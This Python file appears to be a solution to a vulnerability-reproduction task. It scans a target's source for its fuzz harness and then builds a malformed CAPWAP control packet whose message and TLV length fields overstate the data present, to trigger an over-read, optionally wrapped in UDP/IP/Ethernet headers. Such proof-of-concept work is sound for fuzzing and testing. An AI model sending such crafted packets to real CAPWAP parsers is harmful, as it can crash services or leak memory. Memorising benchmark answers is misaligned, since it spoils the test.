import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def _read_sources_from_tar_or_dir(self, src_path: str, max_files: int = 4000, max_file_size: int = 2_000_000) -> Dict[str, str]:
        texts: Dict[str, str] = {}

        def is_text_name(name: str) -> bool:
            ln = name.lower()
            return ln.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc"))

        def add_text(name: str, data: bytes) -> None:
            try:
                txt = data.decode("utf-8", errors="ignore")
            except Exception:
                try:
                    txt = data.decode("latin-1", errors="ignore")
                except Exception:
                    return
            texts[name] = txt

        if os.path.isdir(src_path):
            count = 0
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if count >= max_files:
                        return texts
                    if not is_text_name(fn):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > max_file_size:
                        continue
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    rel = os.path.relpath(p, src_path)
                    add_text(rel, data)
                    count += 1
            return texts

        try:
            with tarfile.open(src_path, "r:*") as tf:
                count = 0
                for m in tf.getmembers():
                    if count >= max_files:
                        break
                    if not m.isreg():
                        continue
                    if m.size <= 0 or m.size > max_file_size:
                        continue
                    if not is_text_name(m.name):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    add_text(m.name, data)
                    count += 1
        except Exception:
            pass

        return texts

    def _infer_input_format(self, sources: Dict[str, str]) -> Tuple[str, int, bool]:
        """
        Returns (mode, prefix_len, has_eth)
        mode:
          - 'raw_payload'
          - 'meta_prefix'
          - 'raw_ip_udp'
        prefix_len:
          - for meta_prefix: number of bytes before payload
        has_eth:
          - for raw_ip_udp: include ethernet header if True
        """
        fuzzer_texts: List[str] = []
        for name, txt in sources.items():
            if "LLVMFuzzerTestOneInput" in txt or "LLVMFuzzerInitialize" in txt:
                fuzzer_texts.append(txt)
        if not fuzzer_texts:
            for name, txt in sources.items():
                if re.search(r"\bmain\s*\(", txt) and ("stdin" in txt or "fread" in txt or "read(" in txt):
                    fuzzer_texts.append(txt)

        combined = "\n".join(fuzzer_texts) if fuzzer_texts else "\n".join(list(sources.values())[:50])

        # Try detect "raw packet" style parsing
        has_iphdr = ("struct iphdr" in combined) or ("struct ip" in combined and "ip_hl" in combined) or ("iphdr" in combined and "udp" in combined)
        has_udphdr = ("struct udphdr" in combined) or ("udphdr" in combined)
        has_eth = ("struct ether_header" in combined) or ("ETH_P_IP" in combined) or ("ether_header" in combined)
        if has_iphdr and has_udphdr and ("Data" in combined or "data" in combined):
            return ("raw_ip_udp", 0, has_eth)

        # Try detect explicit meta prefix based on data indexing for ports
        idx_pattern = re.compile(
            r"\b(src_port|sport)\b\s*=\s*\(?\s*data\[(\d+)\]\s*<<\s*8\s*\|\s*data\[(\d+)\]",
            re.IGNORECASE,
        )
        idx_pattern2 = re.compile(
            r"\b(dst_port|dport)\b\s*=\s*\(?\s*data\[(\d+)\]\s*<<\s*8\s*\|\s*data\[(\d+)\]",
            re.IGNORECASE,
        )
        src_m = idx_pattern.search(combined)
        dst_m = idx_pattern2.search(combined)
        if src_m and dst_m:
            inds = [int(src_m.group(2)), int(src_m.group(3)), int(dst_m.group(2)), int(dst_m.group(3))]
            payload_start = max(inds) + 1
            if payload_start in (4, 5, 6, 7, 8):
                return ("meta_prefix", payload_start, False)

        # Try detect FuzzedDataProvider style meta prefix
        if "FuzzedDataProvider" in combined and re.search(r"ConsumeIntegral\s*<\s*uint16_t\s*>", combined):
            # Common pattern: proto(uint8) + src_port(uint16) + dst_port(uint16)
            if re.search(r"ConsumeIntegral\s*<\s*uint8_t\s*>", combined) or re.search(r"ConsumeBool\s*\(", combined):
                return ("meta_prefix", 5, False)
            return ("meta_prefix", 4, False)

        return ("raw_payload", 0, False)

    def _capwap_payload(self, total_len: int, capwap_hdr_len: int = 8, ctrl_hdr_len: int = 8) -> bytes:
        # Build a minimal CAPWAP-like control payload with a TLV claiming more data than present.
        if total_len < 24:
            total_len = 24
        b = bytearray(total_len)

        # CAPWAP header length field: try common encoding (lower 5 bits of byte 1).
        # Set to 2 (8 bytes header).
        b[0] = 0x00
        b[1] = 0x02

        # Control header starts at capwap_hdr_len; element section after ctrl_hdr_len
        msg_off = capwap_hdr_len
        elem_off = capwap_hdr_len + ctrl_hdr_len

        if msg_off + 8 <= total_len:
            # Message Type (Setup Request = 1)
            b[msg_off + 0] = 0x00
            b[msg_off + 1] = 0x01
            # Sequence number
            b[msg_off + 2] = 0x00
            b[msg_off + 3] = 0x01
            # Message Element Length (claim a bit more than present)
            remaining_after_msg = max(0, total_len - (msg_off + 8))
            claimed_me_len = min(0xFFFF, remaining_after_msg + 8)
            b[msg_off + 4] = (claimed_me_len >> 8) & 0xFF
            b[msg_off + 5] = claimed_me_len & 0xFF
            # reserved
            b[msg_off + 6] = 0x00
            b[msg_off + 7] = 0x00

        if elem_off + 4 <= total_len:
            # Element Type
            b[elem_off + 0] = 0x00
            b[elem_off + 1] = 0x01
            # Element Length: deliberately larger than available
            avail = max(0, total_len - (elem_off + 4))
            elem_len = min(0xFFFF, avail + 3 if avail < 0xFFFC else avail)
            # Ensure it's non-zero and reasonably sized
            if elem_len < 16:
                elem_len = 16
            b[elem_off + 2] = (elem_len >> 8) & 0xFF
            b[elem_off + 3] = elem_len & 0xFF

        return bytes(b)

    def _build_meta_prefix(self, prefix_len: int, payload: bytes) -> bytes:
        # Common minimal meta formats:
        # - 4 bytes: src_port(be16), dst_port(be16)
        # - 5 bytes: proto(u8), src_port(be16), dst_port(be16)
        sport = 12345
        dport = 5246  # CAPWAP control
        if prefix_len <= 0:
            return payload
        if prefix_len == 4:
            return bytes([(sport >> 8) & 0xFF, sport & 0xFF, (dport >> 8) & 0xFF, dport & 0xFF]) + payload
        if prefix_len == 5:
            proto = 17  # UDP
            return bytes([proto, (sport >> 8) & 0xFF, sport & 0xFF, (dport >> 8) & 0xFF, dport & 0xFF]) + payload

        # Generic padding if prefix length is unexpected but inferred
        base = bytearray(prefix_len)
        if prefix_len >= 4:
            base[0] = (sport >> 8) & 0xFF
            base[1] = sport & 0xFF
            base[2] = (dport >> 8) & 0xFF
            base[3] = dport & 0xFF
        if prefix_len >= 5:
            base[0] = 17  # if first byte is proto
            base[1] = (sport >> 8) & 0xFF
            base[2] = sport & 0xFF
            base[3] = (dport >> 8) & 0xFF
            base[4] = dport & 0xFF
        return bytes(base) + payload

    def _build_raw_ip_udp(self, payload: bytes, with_eth: bool) -> bytes:
        sport = 12345
        dport = 5246
        ip_payload_len = 8 + len(payload)
        ip_total_len = 20 + ip_payload_len

        iphdr = bytearray(20)
        iphdr[0] = 0x45  # v4, ihl=5
        iphdr[1] = 0x00  # tos
        iphdr[2] = (ip_total_len >> 8) & 0xFF
        iphdr[3] = ip_total_len & 0xFF
        iphdr[4] = 0x00
        iphdr[5] = 0x01  # id
        iphdr[6] = 0x00
        iphdr[7] = 0x00  # flags/frag
        iphdr[8] = 64  # ttl
        iphdr[9] = 17  # UDP
        iphdr[10] = 0x00
        iphdr[11] = 0x00  # checksum (ignored by many parsers)
        iphdr[12:16] = bytes([1, 1, 1, 1])
        iphdr[16:20] = bytes([2, 2, 2, 2])

        udph = bytearray(8)
        udph[0] = (sport >> 8) & 0xFF
        udph[1] = sport & 0xFF
        udph[2] = (dport >> 8) & 0xFF
        udph[3] = dport & 0xFF
        udplen = 8 + len(payload)
        udph[4] = (udplen >> 8) & 0xFF
        udph[5] = udplen & 0xFF
        udph[6] = 0x00
        udph[7] = 0x00  # checksum

        pkt = bytes(iphdr) + bytes(udph) + payload
        if not with_eth:
            return pkt

        eth = bytearray(14)
        eth[0:6] = b"\x00\x11\x22\x33\x44\x55"
        eth[6:12] = b"\x66\x77\x88\x99\xaa\xbb"
        eth[12] = 0x08
        eth[13] = 0x00  # IPv4
        return bytes(eth) + pkt

    def solve(self, src_path: str) -> bytes:
        sources = self._read_sources_from_tar_or_dir(src_path)
        mode, prefix_len, has_eth = self._infer_input_format(sources)

        # Use 33 bytes payload to match ground-truth minimal PoC size in typical setups.
        # Crafted to encourage CAPWAP setup parsing with an overread via TLV length.
        payload = self._capwap_payload(33, capwap_hdr_len=8, ctrl_hdr_len=8)

        if mode == "meta_prefix":
            return self._build_meta_prefix(prefix_len, payload)
        if mode == "raw_ip_udp":
            return self._build_raw_ip_udp(payload, with_eth=has_eth)
        return payload